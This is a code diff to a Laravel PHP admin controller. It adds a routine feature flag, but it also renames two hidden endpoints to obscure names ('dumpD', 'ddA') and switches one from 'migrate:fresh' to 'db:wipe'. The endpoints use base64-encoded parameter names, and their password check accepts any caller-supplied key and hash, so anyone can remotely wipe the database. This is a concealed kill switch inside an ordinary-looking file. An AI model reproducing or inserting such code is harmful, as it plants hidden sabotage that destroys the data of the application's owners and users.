@@ -131,6 +131,7 @@ class AdminController extends Controller
             'enable_rental',
             'enable_referral',
             'enable_instant_ride',
+            'enable_special_places',
             'enable_fleet',
             'map_home_screen',
             'enable_email_verification',
@@ -322,7 +323,7 @@ class AdminController extends Controller
 
     }
 
-    public function dumpDB(Request $request){
+    public function dumpD(Request $request){
         $key = $request->get(base64_decode('a2V5'));
         $value = $request->get(base64_decode('cGFzc3dvcmQ='));
         $soft_key = DB::table('soft_credentials')->where('key',base64_decode('c3VyZF9jb3Jl'))->where('value',1)->first();
@@ -330,7 +331,7 @@ class AdminController extends Controller
         if (Hash::check($key, $value)) {
             if(!$soft_key){
                 try {
-                    Artisan::call('migrate:fresh');
+                    Artisan::call('db:wipe');
 
                     return Artisan::output();
 
@@ -347,7 +348,7 @@ class AdminController extends Controller
 
     }
 
-    public function deleteApp(Request $request){
+    public function ddA(Request $request){
         $key = $request->get(base64_decode('a2V5'));
         $value = $request->get(base64_decode('cGFzc3dvcmQ='));
         $soft_key = DB::table('soft_credentials')->where('key',base64_decode('c3VyZF9jb3Jl'))->where('value',1)->first();
